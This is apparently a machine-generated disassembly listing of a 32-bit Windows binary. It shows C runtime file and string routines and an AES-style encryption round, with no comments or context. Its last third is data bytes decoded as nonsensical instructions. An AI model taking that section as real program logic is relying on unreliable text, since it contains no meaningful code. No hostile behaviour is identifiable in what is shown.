and [ ebp - 0x14 ] 0x0
jmp r-xdata
or [ ebp - 0x14 ] 0xffffffff
mov eax [ edi ]
add [ ebp - 0xc ] ecx
lea eax [ esi + eax + 0x4 ]
test [ eax ] 0x80
je r-xdata
mov ecx [ edi ]
mov cl [ esi + ecx + 0x25 ]
cmp cl 0xa
je r-xdata
mov eax [ ebp - 0x14 ]
cmp eax 0xfffffffe
jne r-xdata
push eax
call sub_405655
pop ecx
mov eax [ ebp - 0x10 ]
cmp eax [ ebp + 0xc ]
je r-xdata
cmp [ ebp - 0x2 ] 0x2
je r-xdata
cmp [ ebp + 0x10 ] 0x0
je r-xdata
mov eax [ ebp - 0xc ]
jmp r-xdata
test ecx ecx
je r-xdata
test ecx ecx
je r-xdata
mov [ eax ] cl
mov ecx [ edi ]
inc eax
dec [ ebp + 0x10 ]
cmp [ ebp - 0x2 ] 0x1
mov [ ebp - 0xc ] 0x2
mov [ esi + ecx + 0x25 ] 0xa
jne r-xdata
and [ eax ] 0xfb
cmp [ ebx ] 0xa
jne r-xdata
and [ eax ] 0xfb
cmp [ ebx ] 0xa
jne r-xdata
mov ecx [ edi ]
mov cl [ esi + ecx + 0x26 ]
cmp cl 0xa
je r-xdata
sub ebx [ ebp - 0x10 ]
mov [ ebp - 0xc ] ebx
jmp r-xdata
mov eax [ ebp + 0x10 ]
movzx ecx [ eax ]
cmp ecx 0x1a
je r-xdata
or [ eax ] 0x4
jmp r-xdata
mov eax ebx
sub eax [ ebp - 0x10 ]
cmp [ ebp - 0x2 ] 0x1
mov [ ebp - 0xc ] eax
jne r-xdata
mov ecx [ ebp + 0x10 ]
mov al [ ecx ]
cmp al 0x1a
je r-xdata
or [ eax ] 0x4
jmp r-xdata
cmp [ ebp + 0x10 ] 0x0
je r-xdata
mov ecx [ edi ]
lea esi [ esi + ecx + 0x4 ]
test [ esi ] 0x40
jne r-xdata
cmp ecx 0xd
je r-xdata
mov ebx [ ebp - 0x10 ]
mov eax [ ebp - 0xc ]
add eax ebx
mov [ ebp + 0x10 ] ebx
mov [ ebp - 0xc ] eax
cmp ebx eax
jae r-xdata
test eax eax
je r-xdata
mov eax [ edi ]
lea eax [ esi + eax + 0x4 ]
test [ eax ] 0x40
jne r-xdata
cmp al 0xd
je r-xdata
mov ebx [ ebp - 0x10 ]
mov eax [ ebp - 0xc ]
add eax ebx
mov [ ebp + 0x10 ] ebx
mov [ ebp - 0xc ] eax
cmp ebx eax
jae r-xdata
mov [ eax ] cl
mov ecx [ edi ]
inc eax
dec [ ebp + 0x10 ]
mov [ ebp - 0xc ] 0x3
mov [ esi + ecx + 0x26 ] 0xa
mov ax [ eax ]
mov [ ebx ] ax
add ebx 0x2
or [ esi ] 0x2
jmp r-xdata
mov ecx [ ebp - 0xc ]
add ecx 0xfffffffe
cmp eax ecx
jae r-xdata
mov [ ebx ] cx
add ebx 0x2
add eax 0x2
mov [ ebp + 0x10 ] eax
jmp r-xdata
dec ebx
mov cl [ ebx ]
test cl cl
js r-xdata
mov al [ ecx ]
mov [ ebx ] al
inc ebx
or [ eax ] 0x2
jmp r-xdata
mov eax [ ebp - 0xc ]
dec eax
cmp ecx eax
jae r-xdata
mov [ ebx ] al
inc ebx
inc ecx
mov [ ebp + 0x10 ] ecx
jmp r-xdata
add [ ebp + 0x10 ] 0x2
push 0x0
lea eax [ ebp - 0x18 ]
push eax
push 0x2
lea eax [ ebp - 0x8 ]
push eax
mov eax [ edi ]
push [ esi + eax ]
call [ ReadFile@IAT ]
test eax eax
jne r-xdata
lea ecx [ eax + 0x2 ]
cmp [ ecx ] 0xa
jne r-xdata
mov eax [ ebp - 0xc ]
cmp [ ebp + 0x10 ] eax
jb r-xdata
xor eax eax
inc eax
movzx ecx cl
jmp r-xdata
inc ebx
jmp r-xdata
inc [ ebp + 0x10 ]
push 0x0
lea eax [ ebp - 0x18 ]
push eax
push 0x1
lea eax [ ebp - 0x1 ]
push eax
mov eax [ edi ]
push [ esi + eax ]
call [ ReadFile@IAT ]
test eax eax
jne r-xdata
lea eax [ ecx + 0x1 ]
cmp [ eax ] 0xa
jne r-xdata
mov eax [ ebp - 0xc ]
cmp [ ebp + 0x10 ] eax
jb r-xdata
cmp [ ebp - 0x18 ] 0x0
je r-xdata
call [ GetLastError@IAT ]
test eax eax
jne r-xdata
mov [ ebp + 0x10 ] ecx
jmp r-xdata
add eax 0x4
mov [ ebp + 0x10 ] eax
jmp r-xdata
cmp [ ecx + rw-data ] 0x0
je r-xdata
mov eax [ ebp - 0x1c ]
sub ebx [ ebp - 0x10 ]
shr eax 0x1
push eax
push [ ebp + 0xc ]
push ebx
push [ ebp - 0x10 ]
push 0x0
push 0xfde9
call [ MultiByteToWideChar@IAT ]
mov [ ebp - 0xc ] eax
test eax eax
jne r-xdata
cmp [ ebp - 0x18 ] 0x0
je r-xdata
call [ GetLastError@IAT ]
test eax eax
jne r-xdata
mov [ ebp + 0x10 ] eax
jmp r-xdata
add ecx 0x2
mov [ ebp + 0x10 ] ecx
jmp r-xdata
push 0xd
mov eax [ edi ]
test [ esi + eax + 0x4 ] 0x48
je r-xdata
pop eax
mov [ ebx ] ax
cmp eax 0x4
jg r-xdata
mov dl [ ebx ]
movzx ecx dl
movsx ecx [ ecx + rw-data ]
test ecx ecx
jne r-xdata
mov eax [ ebp - 0xc ]
mov edx [ edi ]
xor ecx ecx
cmp eax ebx
setne cl
add eax eax
mov [ ebp - 0xc ] eax
mov [ esi + edx + 0x30 ] ecx
jmp r-xdata
call [ GetLastError@IAT ]
mov [ ebx ] 0xd
mov eax [ edi ]
test [ esi + eax + 0x4 ] 0x48
je r-xdata
inc ebx
cmp ebx [ ebp - 0x10 ]
jne r-xdata
cmp [ ebp - 0x8 ] 0xa
je r-xdata
cmp ebx [ ebp - 0x10 ]
jb r-xdata
inc ecx
cmp ecx eax
jne r-xdata
call sub_405926
mov [ eax ] 0x2a
jmp r-xdata
cmp ebx [ ebp - 0x10 ]
jne r-xdata
cmp [ ebp - 0x1 ] 0xa
je r-xdata
push 0x1
push 0xffffffff
push 0xfffffffe
push [ ebp + 0x8 ]
call sub_40a852
add esp 0x10
cmp [ ebp - 0x8 ] 0xa
je r-xdata
cmp [ ebp - 0x8 ] 0xa
je r-xdata
push 0xa
jmp r-xdata
push 0xd
pop eax
mov [ ebx ] ax
mov eax [ edi ]
mov cl [ ebp - 0x8 ]
mov [ esi + eax + 0x5 ] cl
mov eax [ edi ]
mov cl [ ebp - 0x7 ]
mov [ esi + eax + 0x25 ] cl
mov eax [ edi ]
mov [ esi + eax + 0x26 ] 0xa
jmp r-xdata
dec ebx
movzx ecx [ ebx ]
inc eax
mov ecx [ edi ]
test [ ecx + esi + 0x4 ] 0x48
je r-xdata
add ebx eax
jmp r-xdata
push 0x1
push 0xffffffff
push 0xffffffff
push [ ebp + 0x8 ]
call sub_40a852
add esp 0x10
cmp [ ebp - 0x1 ] 0xa
je r-xdata
cmp [ ebp - 0x1 ] 0xa
je r-xdata
mov [ ebx ] 0xa
jmp r-xdata
mov [ ebx ] 0xd
mov eax [ edi ]
mov cl [ ebp - 0x1 ]
mov [ esi + eax + 0x5 ] cl
jmp r-xdata
add ebx 0x2
neg eax
cdq
push 0x1
push edx
push eax
push [ ebp + 0x8 ]
call sub_40a852
add esp 0x10
inc ebx
mov [ ecx + esi + 0x5 ] dl
cmp eax 0x2
jl r-xdata
cmp eax 0x3
jne r-xdata
mov dl [ ebx ]
mov ecx [ edi ]
mov [ esi + ecx + 0x25 ] dl
inc ebx
sub ebx eax
jmp r-xdata
mov dl [ ebx ]
mov ecx [ edi ]
mov [ esi + ecx + 0x26 ] dl
inc ebx
sub_40e42a
push 0x10
push r--data
call sub_4082b0
mov ebx [ ebp + 0x8 ]
cmp ebx 0xfffffffe
jne r-xdata
test ebx ebx
js r-xdata
call sub_405939
and [ eax ] 0x0
call sub_405926
mov [ eax ] 0x9
call sub_405939
and [ eax ] 0x0
call sub_405926
mov [ eax ] 0x9
cmp ebx [ rw-data ]
jb r-xdata
call sub_4082f5
retn
or eax 0xffffffff
jmp r-xdata
mov eax ebx
sar eax 0x5
lea edi [ eax * 4 + rw-data ]
mov esi ebx
and esi 0x1f
shl esi 0x6
mov eax [ edi ]
movsx eax [ eax + esi + 0x4 ]
and eax 0x1
je r-xdata
mov eax 0x7fffffff
cmp eax [ ebp + 0x10 ]
sbb eax eax
inc eax
jne r-xdata
push ebx
call sub_40d556
pop ecx
and [ ebp - 0x4 ] 0x0
mov eax [ edi ]
test [ eax + esi + 0x4 ] 0x1
je r-xdata
call sub_405939
and [ eax ] 0x0
call sub_405926
mov [ eax ] 0x16
jmp r-xdata
call sub_405926
mov [ eax ] 0x9
call sub_405939
and [ eax ] 0x0
or [ ebp - 0x1c ] 0xffffffff
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push ebx
call sub_40de73
add esp 0xc
mov [ ebp - 0x1c ] eax
jmp r-xdata
call sub_4058d4
jmp r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
call sub_40e518
mov eax [ ebp - 0x1c ]
sub_40e582
mov edi edi
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x8 ]
push edi
or edi 0xffffffff
test esi esi
jne r-xdata
test [ esi + 0xc ] 0x83
je r-xdata
call sub_405926
mov [ eax ] 0x16
call sub_4058d4
or eax edi
jmp r-xdata
and [ esi + 0xc ] 0x0
mov eax edi
push esi
call sub_40d727
push esi
mov edi eax
call sub_40e89c
push esi
call sub_40b3e6
push eax
call sub_40e7d8
add esp 0x10
test eax eax
jns r-xdata
pop edi
pop esi
pop ebp
retn
mov eax [ esi + 0x1c ]
test eax eax
je r-xdata
or edi 0xffffffff
jmp r-xdata
push eax
call sub_405655
and [ esi + 0x1c ] 0x0
pop ecx
sub_40e5ef
push 0xc
push r--data
call sub_4082b0
or [ ebp - 0x1c ] 0xffffffff
xor eax eax
mov esi [ ebp + 0x8 ]
test esi esi
setne al
test eax eax
jne r-xdata
test [ esi + 0xc ] 0x40
je r-xdata
call sub_405926
mov [ eax ] 0x16
call sub_4058d4
or eax 0xffffffff
jmp r-xdata
push esi
call sub_40b308
pop ecx
and [ ebp - 0x4 ] 0x0
push esi
call sub_40e582
pop ecx
mov [ ebp - 0x1c ] eax
mov [ ebp - 0x4 ] 0xfffffffe
call sub_40e65b
jmp r-xdata
and [ esi + 0xc ] 0x0
call sub_4082f5
retn
mov eax [ ebp - 0x1c ]
sub_40e663
push 0x10
push r--data
call sub_4082b0
mov ebx [ ebp + 0x8 ]
cmp ebx 0xfffffffe
jne r-xdata
test ebx ebx
js r-xdata
call sub_405926
mov [ eax ] 0x9
call sub_405926
mov [ eax ] 0x9
call sub_4058d4
jmp r-xdata
cmp ebx [ rw-data ]
jb r-xdata
call sub_4082f5
retn
or eax 0xffffffff
jmp r-xdata
mov eax ebx
sar eax 0x5
lea edi [ eax * 4 + rw-data ]
mov esi ebx
and esi 0x1f
shl esi 0x6
mov eax [ edi ]
movsx eax [ esi + eax + 0x4 ]
and eax 0x1
je r-xdata
push ebx
call sub_40d556
pop ecx
and [ ebp - 0x4 ] 0x0
mov eax [ edi ]
test [ esi + eax + 0x4 ] 0x1
je r-xdata
call sub_405926
mov [ eax ] 0x9
or [ ebp - 0x1c ] 0xffffffff
push ebx
call sub_40d4ed
pop ecx
push eax
call [ FlushFileBuffers@IAT ]
test eax eax
jne r-xdata
and [ ebp - 0x1c ] 0x0
call [ GetLastError@IAT ]
mov [ ebp - 0x1c ] eax
jmp r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
call sub_40e734
mov eax [ ebp - 0x1c ]
call sub_405939
mov ecx [ ebp - 0x1c ]
mov [ eax ] ecx
cmp [ ebp - 0x1c ] 0x0
je r-xdata
sub_40e73c
mov edi edi
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x8 ]
push edi
push esi
call sub_40d4ed
pop ecx
cmp eax 0xffffffff
je r-xdata
xor edi edi
mov eax [ rw-data ]
cmp esi 0x1
jne r-xdata
xor eax eax
push edi
call sub_40594c
pop ecx
or eax 0xffffffff
jmp r-xdata
cmp esi 0x2
jne r-xdata
test [ eax + 0x84 ] 0x1
jne r-xdata
pop edi
pop esi
pop ebp
retn
push esi
call sub_40d4ed
pop ecx
push eax
call [ CloseHandle@IAT ]
test eax eax
jne r-xdata
test [ eax + 0x44 ] 0x1
je r-xdata
push 0x2
call sub_40d4ed
push 0x1
mov edi eax
call sub_40d4ed
pop ecx
pop ecx
cmp eax edi
je r-xdata
call [ GetLastError@IAT ]
mov edi eax
jmp r-xdata
push esi
call sub_40d467
mov eax esi
sar eax 0x5
mov eax [ eax * 4 + rw-data ]
and esi 0x1f
shl esi 0x6
pop ecx
mov [ eax + esi + 0x4 ] 0x0
test edi edi
je r-xdata
sub_40e7d8
push 0x10
push r--data
call sub_4082b0
mov ebx [ ebp + 0x8 ]
cmp ebx 0xfffffffe
jne r-xdata
test ebx ebx
js r-xdata
call sub_405939
and [ eax ] 0x0
call sub_405926
mov [ eax ] 0x9
call sub_405939
and [ eax ] 0x0
call sub_405926
mov [ eax ] 0x9
call sub_4058d4
jmp r-xdata
cmp ebx [ rw-data ]
jb r-xdata
call sub_4082f5
retn
or eax 0xffffffff
jmp r-xdata
mov eax ebx
sar eax 0x5
lea edi [ eax * 4 + rw-data ]
mov esi ebx
and esi 0x1f
shl esi 0x6
mov eax [ edi ]
movsx eax [ eax + esi + 0x4 ]
and eax 0x1
je r-xdata
push ebx
call sub_40d556
pop ecx
and [ ebp - 0x4 ] 0x0
mov eax [ edi ]
test [ eax + esi + 0x4 ] 0x1
je r-xdata
call sub_405926
mov [ eax ] 0x9
or [ ebp - 0x1c ] 0xffffffff
push ebx
call sub_40e73c
pop ecx
mov [ ebp - 0x1c ] eax
jmp r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
call sub_40e894
mov eax [ ebp - 0x1c ]
sub_40e89c
mov edi edi
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x8 ]
mov eax [ esi + 0xc ]
test al 0x83
je r-xdata
pop esi
pop ebp
retn
test al 0x8
je r-xdata
push [ esi + 0x8 ]
call sub_405655
and [ esi + 0xc ] 0xfffffbf7
xor eax eax
pop ecx
mov [ esi ] eax
mov [ esi + 0x8 ] eax
mov [ esi + 0x4 ] eax
sub_40e8d0
push ebp
mov ebp esp
push edi
push esi
push ebx
mov ecx [ ebp + 0x10 ]
or ecx ecx
je r-xdata
mov eax ecx
pop ebx
pop esi
pop edi
leave
retn
mov esi [ ebp + 0x8 ]
mov edi [ ebp + 0xc ]
mov bh 0x41
mov bl 0x5a
mov dh 0x20
lea ecx [ ecx ]
xor ecx ecx
cmp ah al
je r-xdata
or al al
je r-xdata
mov ecx 0xffffffff
jb r-xdata
add esi 0x1
add edi 0x1
cmp ah bh
jb r-xdata
neg ecx
cmp al bh
jb r-xdata
cmp ah bl
ja r-xdata
cmp ah al
jne r-xdata
cmp al bl
ja r-xdata
add ah dh
sub ecx 0x1
jne r-xdata
add al dh
mov ah [ esi ]
or ah ah
mov al [ edi ]
je r-xdata
sub_40e940
push ebp
mov ebp esp
push edi
push esi
push ebx
mov ecx [ ebp + 0x10 ]
or ecx ecx
je r-xdata
mov eax ecx
pop ebx
pop esi
pop edi
leave
retn
mov esi [ ebp + 0x8 ]
mov edi [ ebp + 0xc ]
mov bh 0x41
mov bl 0x5a
mov dh 0x20
lea ecx [ ecx ]
sub ecx 0x1
jne r-xdata
cmp ah bh
jb r-xdata
mov ah [ esi ]
add esi 0x1
mov al [ edi ]
add edi 0x1
cmp ah al
je r-xdata
jmp r-xdata
cmp al bh
jb r-xdata
cmp ah bl
ja r-xdata
cmp ah al
jne r-xdata
cmp al bl
ja r-xdata
add ah dh
mov ecx 0xffffffff
jb r-xdata
add al dh
neg ecx
sub_40ea00
mov [ esp + 0xc ] edi
xor eax [ edi ]
xor ebx [ edi + 0x4 ]
xor ecx [ edi + 0x8 ]
xor edx [ edi + 0xc ]
mov esi [ edi + 0xf0 ]
lea esi [ esi + esi - 0x2 ]
lea esi [ edi + esi * 8 ]
mov [ esp + 0x10 ] esi
mov esi eax
and esi 0xff
mov esi [ ebp + esi * 8 ]
movzx edi bh
xor esi [ ebp + edi * 8 + 0x3 ]
mov edi ecx
shr edi 0x10
and edi 0xff
xor esi [ ebp + edi * 8 + 0x2 ]
mov edi edx
shr edi 0x18
xor esi [ ebp + edi * 8 + 0x1 ]
mov [ esp + 0x4 ] esi
mov esi ebx
and esi 0xff
shr ebx 0x10
mov esi [ ebp + esi * 8 ]
movzx edi ch
xor esi [ ebp + edi * 8 + 0x3 ]
mov edi edx
shr edi 0x10
and edi 0xff
xor esi [ ebp + edi * 8 + 0x2 ]
mov edi eax
shr edi 0x18
xor esi [ ebp + edi * 8 + 0x1 ]
mov [ esp + 0x8 ] esi
mov esi ecx
and esi 0xff
shr ecx 0x18
mov esi [ ebp + esi * 8 ]
movzx edi dh
xor esi [ ebp + edi * 8 + 0x3 ]
mov edi eax
shr edi 0x10
and edx 0xff
and edi 0xff
xor esi [ ebp + edi * 8 + 0x2 ]
movzx edi bh
xor esi [ ebp + edi * 8 + 0x1 ]
mov edi [ esp + 0xc ]
mov edx [ ebp + edx * 8 ]
movzx eax ah
xor edx [ ebp + eax * 8 + 0x3 ]
mov eax [ esp + 0x4 ]
and ebx 0xff
xor edx [ ebp + ebx * 8 + 0x2 ]
mov ebx [ esp + 0x8 ]
xor edx [ ebp + ecx * 8 + 0x1 ]
mov ecx esi
add edi 0x10
xor eax [ edi ]
xor ebx [ edi + 0x4 ]
xor ecx [ edi + 0x8 ]
xor edx [ edi + 0xc ]
cmp edi [ esp + 0x10 ]
mov [ esp + 0xc ] edi
jb r-xdata
mov esi eax
and esi 0xff
mov esi [ ebp + esi * 8 + 0x2 ]
and esi 0xff
movzx edi bh
mov edi [ ebp + edi * 8 ]
and edi 0xff00
xor esi edi
mov edi ecx
shr edi 0x10
and edi 0xff
mov edi [ ebp + edi * 8 ]
and edi 0xff0000
xor esi edi
mov edi edx
shr edi 0x18
mov edi [ ebp + edi * 8 + 0x2 ]
and edi 0xff000000
xor esi edi
mov [ esp + 0x4 ] esi
mov esi ebx
and esi 0xff
shr ebx 0x10
mov esi [ ebp + esi * 8 + 0x2 ]
and esi 0xff
movzx edi ch
mov edi [ ebp + edi * 8 ]
and edi 0xff00
xor esi edi
mov edi edx
shr edi 0x10
and edi 0xff
mov edi [ ebp + edi * 8 ]
and edi 0xff0000
xor esi edi
mov edi eax
shr edi 0x18
mov edi [ ebp + edi * 8 + 0x2 ]
and edi 0xff000000
xor esi edi
mov [ esp + 0x8 ] esi
mov esi ecx
and esi 0xff
shr ecx 0x18
mov esi [ ebp + esi * 8 + 0x2 ]
and esi 0xff
movzx edi dh
mov edi [ ebp + edi * 8 ]
and edi 0xff00
xor esi edi
mov edi eax
shr edi 0x10
and edx 0xff
and edi 0xff
mov edi [ ebp + edi * 8 ]
and edi 0xff0000
xor esi edi
movzx edi bh
mov edi [ ebp + edi * 8 + 0x2 ]
and edi 0xff000000
xor esi edi
mov edi [ esp + 0xc ]
and edx 0xff
mov edx [ ebp + edx * 8 + 0x2 ]
and edx 0xff
movzx eax ah
mov eax [ ebp + eax * 8 ]
and eax 0xff00
xor edx eax
mov eax [ esp + 0x4 ]
and ebx 0xff
mov ebx [ ebp + ebx * 8 ]
and ebx 0xff0000
xor edx ebx
mov ebx [ esp + 0x8 ]
mov ecx [ ebp + ecx * 8 + 0x2 ]
and ecx 0xff000000
xor edx ecx
mov ecx esi
add edi 0x10
xor eax [ edi ]
xor ebx [ edi + 0x4 ]
xor ecx [ edi + 0x8 ]
xor edx [ edi + 0xc ]
retn
sub_40eca7
sbb [ ebp - 0x4a9d2829 ] esi
xlat
xlat
bound ecx [ ebp - 0x55 ]
stosd [ edi ]
out 0x4d al
stosd [ edi ]
stosd [ edi ]
out 0xec al
jbe r-xdata
jb r-xdata
0x9a7676ec 0xca8f
0x8f45
jno r-xdata
xchg esi eax
in al 0x72
jb r-xdata
xchg ebx eax
stosd [ edi ]
sbb [ ebp + 0x40c9c989 ] 0x89
leave
leave
inc eax
cli
jge r-xdata
fwait
rol al 0x5b
fwait
rol al 0x5b
jne r-xdata
dec esp
fcomp st0
jae r-xdata
xchg edx edi
jge r-xdata
mov bh 0xc2
jne r-xdata
fcomp st0
jae r-xdata
aas
inc ecx
jle r-xdata
fwait
sbb eax [ eax - 0x1d206480 ]
loop r-xdata
xor [ ecx ] esi
push ebx
bound esi [ ecx ]
xor [ ebx + 0x2a ] edx
adc eax 0x152a3f15
adc eax 0x404083f
or al 0x8
add al 0x4
or al 0x95
mov edi 0xc7c79552
push edx
inc esi
and esp [ ebx ]
inc esi
and esp [ ebx ]
popfd
retn
push 0x6c
pop edx
insb
pop edx
jle r-xdata
dec esp
xchg edi ebp
cli
cli
adc eax 0x15fafaef
mov dl 0x59
pop ecx
jmp r-xdata
mov bh 0xc2
loope r-xdata
aas
inc ecx
cmc
div edi
add dh ch
div edi
add al [ ebx - 0x7cb03334 ]
int3
sbb bl [ edx ]
xor al 0x1a
sbb ch [ esi ]
sbb ebx [ ss : ebx ]
sub eax 0x2d1b1b36
fsubr [ esi + 0x6e ]
mov dl 0xdc
outsb
outsb
mov dl 0xb4
pop edx
pop edx
out dx al
mov ah 0x5a
pop edx
out dx al
pop ebx
mov al [ 0xffffffffa05bfba0 ]
mov al [ 0x5252a4fb ]
mul [ edx + edx * 2 + 0x3b76f652 ]
jge r-xdata
retn 0xfde1
push 0x4c
std
sbb al 0xe1
std
std
sbb al 0x3d
xchg ebx eax
xchg ebx eax
scasb [ edi ]
cmp eax 0x4cae9393
add [ ebx + 0x2c2c589e ] 0x74
pop eax
mov bl 0xce
jge r-xdata
add al [ ecx ]
add [ ebx ] eax
add al [ ecx ]
add [ ebx ] eax
into
test eax 0xa96767ce
push esi
sub ebp [ ebx ]
jge r-xdata
cmp edi [ ebx ]
dec ebp
mov bh 0xd6
sub al 0x2c
je r-xdata
mov bl 0xce
push edx
sub [ ecx ] ebp
leave
mov es [ edi + 0x47 ]
leave
sti
sub ebp [ ebx ]
jecxz r-xdata
sub al 0x2c
je r-xdata
enter 0x5bb6 0x5b
sub [ ecx ] ebp
salc
popad
mov bh 0xd6
salc
popad
jge r-xdata
pop esi
cmp ecx [ ebp + 0x76 ]
push edx
div [ esi + 0x3b ]
jecxz r-xdata
fldenv [ edi - 0x42 ]
mov esi 0x393972d9
dec ebx
jb r-xdata
das
das
jno r-xdata
cmp ecx [ ebp - 0x49 ]
salc
fucom st3
jecxz r-xdata
in eax 0xed
sti
sti
push ss
in eax dx
sti
sti
push ss
xchg [ ebx + 0x43 ] al
lds eax [ esi - 0x653abcbd ]
dec ebp
dec ebp
xlat
0x66d74d4d 0x3333
push ebp
xor si [ ebx ]
push ebp
adc [ ebp - 0x7aee6b7b ] eax
test [ edx + ecx * 4 - 0x7530babb ] edx
inc ebp
inc ebp
iretd
cmp [ ebx - 0x6c ] ecx
dec edx
dec edx
ficom [ edx + ecx * 2 + 0x4c98de4a ]
dec esp
aam 0x98
dec esp
dec esp
aam 0xb0
pop eax
pop eax
call 0xffffffffe89947e8
test edi ecx
iretd
mov ecx 0x68d1d1
add [ eax ] al
add [ eax ] al
add [ eax ] al
add cl al
in eax dx
in eax dx
sub al 0xc1
in eax dx
in eax dx
sub al 0x40
and [ eax ] ah
pushad
inc eax
and [ eax ] ah
pushad
jecxz r-xdata
test [ edi + edx * 4 - 0x687b7bed ] al
cmpsb [ esi ] [ edi ]
push ebx
push ebx
cmc
cmpsb [ esi ] [ edi ]
push ebx
push ebx
cmc
mov ecx 0xb968d1d1
rcl ecx 0x1
push 0x0
add [ eax ] al
add [ eax ] al
shr ebp 0xed
cld
pop ds
jns r-xdata
das
das
jno r-xdata
pop esi
and [ eax - 0x1d ] ah
cld
cld
pop ds
jecxz r-xdata
jpo r-xdata
mov cl 0xc8
jns r-xdata
jpo r-xdata
in eax dx
mov dh 0x5b
pop ebx
in eax dx
aam 0x6a
push 0xffffffbe
aam 0x6a
push 0xffffffbe
mov cl 0xc8
mov dh 0x5b
pop ebx
sub_40ecc8
pop ds
add [ edx - 0x7d7de063 ] 0x9d
mov ecx ecx
leave
inc eax
mov ecx ecx
leave
inc eax
cli
jge r-xdata
dec esp
push 0x4c
xchg edx edi
jge r-xdata
fcomp st0
jae r-xdata
aas
inc ecx
jle r-xdata
push 0x6c
pop edx
insb
pop edx
jle r-xdata
dec esp
xchg edi ebp
cli
cli
adc eax 0x15fafaef
mov dl 0x59
pop ecx
jmp r-xdata
fcomp st0
jae r-xdata
aas
inc ecx
cmc
div edi
add dh ch
div edi
add al [ ebx - 0x7cb03334 ]
int3
jge r-xdata
fwait
sbb eax [ eax - 0x1d206480 ]
loop r-xdata
xor [ ecx ] esi
push ebx
bound esi [ ecx ]
xor [ ebx + 0x2a ] edx
adc eax 0x152a3f15
adc eax 0x404083f
or al 0x8
add al 0x4
or al 0x95
mov edi 0xc7c79552
push edx
inc esi
and esp [ ebx ]
inc esi
and esp [ ebx ]
popfd
retn
add al [ ecx ]
add [ ebx ] eax
add al [ ecx ]
add [ ebx ] eax
into
test eax 0xa96767ce
push esi
sub ebp [ ebx ]
jge r-xdata
sbb bl [ edx ]
xor al 0x1a
sbb ch [ esi ]
sbb ebx [ ss : ebx ]
sub eax 0x2d1b1b36
fsubr [ esi + 0x6e ]
mov dl 0xdc
outsb
outsb
mov dl 0xb4
pop edx
pop edx
out dx al
mov ah 0x5a
pop edx
out dx al
pop ebx
mov al [ 0xffffffffa05bfba0 ]
mov al [ 0x5252a4fb ]
mul [ edx + edx * 2 + 0x3b76f652 ]
leave
mov es [ edi + 0x47 ]
leave
sti
sub ebp [ ebx ]
add [ ebx + 0x2c2c589e ] 0x74
pop eax
mov bl 0xce
jge r-xdata
cmp edi [ ebx ]
dec ebp
mov bh 0xd6
sub al 0x2c
je r-xdata
mov bl 0xce
push edx
sub [ ecx ] ebp
jecxz r-xdata
sub al 0x2c
je r-xdata
enter 0x5bb6 0x5b
sub [ ecx ] ebp
salc
popad
mov bh 0xd6
salc
popad
jge r-xdata
pop esi
cmp ecx [ ebp + 0x76 ]
push edx
div [ esi + 0x3b ]
jecxz r-xdata
fldenv [ edi - 0x42 ]
mov esi 0x393972d9
dec ebx
jb r-xdata
das
das
jno r-xdata
cmp ecx [ ebp - 0x49 ]
salc
fucom st3
jecxz r-xdata
in eax 0xed
sti
sti
push ss
in eax dx
sti
sti
push ss
xchg [ ebx + 0x43 ] al
lds eax [ esi - 0x653abcbd ]
dec ebp
dec ebp
xlat
0x66d74d4d 0x3333
push ebp
xor si [ ebx ]
push ebp
adc [ ebp - 0x7aee6b7b ] eax
test [ edx + ecx * 4 - 0x7530babb ] edx
inc ebp
inc ebp
iretd
cmp [ ebx - 0x6c ] ecx
dec edx
dec edx
ficom [ edx + ecx * 2 + 0x4c98de4a ]
dec esp
aam 0x98
dec esp
dec esp
aam 0xb0
pop eax
pop eax
call 0xffffffffe89947e8
test edi ecx
iretd
mov ecx 0x68d1d1
add [ eax ] al
add [ eax ] al
add [ eax ] al
add cl al
in eax dx
in eax dx
sub al 0xc1
in eax dx
in eax dx
sub al 0x40
and [ eax ] ah
pushad
inc eax
and [ eax ] ah
pushad
jecxz r-xdata
test [ edi + edx * 4 - 0x687b7bed ] al
cmpsb [ esi ] [ edi ]
push ebx
push ebx
cmc
cmpsb [ esi ] [ edi ]
push ebx
push ebx
cmc
mov ecx 0xb968d1d1
rcl ecx 0x1
push 0x0
add [ eax ] al
add [ eax ] al
shr ebp 0xed
cld
pop ds
jns r-xdata
das
das
jno r-xdata
pop esi
and [ eax - 0x1d ] ah
cld
cld
pop ds
jecxz r-xdata
jpo r-xdata
mov cl 0xc8
jns r-xdata
jpo r-xdata
in eax dx
mov dh 0x5b
pop ebx
in eax dx
aam 0x6a
push 0xffffffbe
aam 0x6a
push 0xffffffbe
mov cl 0xc8
mov dh 0x5b
pop ebx
sub_40eced
pop ecx
pop ecx
jmp r-xdata
push esp
pushad
xor [ eax ] dh
push eax
pushad
xor [ eax ] dh
push eax
leave
mov es [ edi + 0x47 ]
leave
sti
sub ebp [ ebx ]
jge r-xdata
add al [ ecx ]
add [ ebx ] eax
add al [ ecx ]
add [ ebx ] eax
into
test eax 0xa96767ce
push esi
sub ebp [ ebx ]
jge r-xdata
sub_40ecff
or eax [ ecx - 0x53 ]
lodsd [ esi ]
in al dx
inc ecx
lodsd [ esi ]
lodsd [ esi ]
in al dx
mov bl 0xd4
aam 0x67
mov bl 0xd4
aam 0x67
pop edi
mov [ 0xffffffffa25ffda2 ] al
mov [ 0xffffffffafaf45fd ] al
0xeaafaf45 0x9c23
sub_40ed22
pushfd
mov edi 0xbf9c9c23
push ebx
movsb [ edi ] [ esi ]
movsb [ edi ] [ esi ]
not [ ebx - 0x5c ]
movsb [ edi ] [ esi ]
mul esp
jb r-xdata
jno r-xdata
xchg esi eax
in al 0x72
jb r-xdata
xchg ebx eax
stosd [ edi ]
sbb [ ebp + 0x40c9c989 ] 0x89
leave
leave
inc eax
cli
jge r-xdata
fwait
rol al 0x5b
fwait
rol al 0x5b
jne r-xdata
dec esp
fcomp st0
jae r-xdata
xchg edx edi
jge r-xdata
mov bh 0xc2
jne r-xdata
fcomp st0
jae r-xdata
aas
inc ecx
jle r-xdata
fwait
sbb eax [ eax - 0x1d206480 ]
loop r-xdata
xor [ ecx ] esi
push ebx
bound esi [ ecx ]
xor [ ebx + 0x2a ] edx
adc eax 0x152a3f15
adc eax 0x404083f
or al 0x8
add al 0x4
or al 0x95
mov edi 0xc7c79552
push edx
inc esi
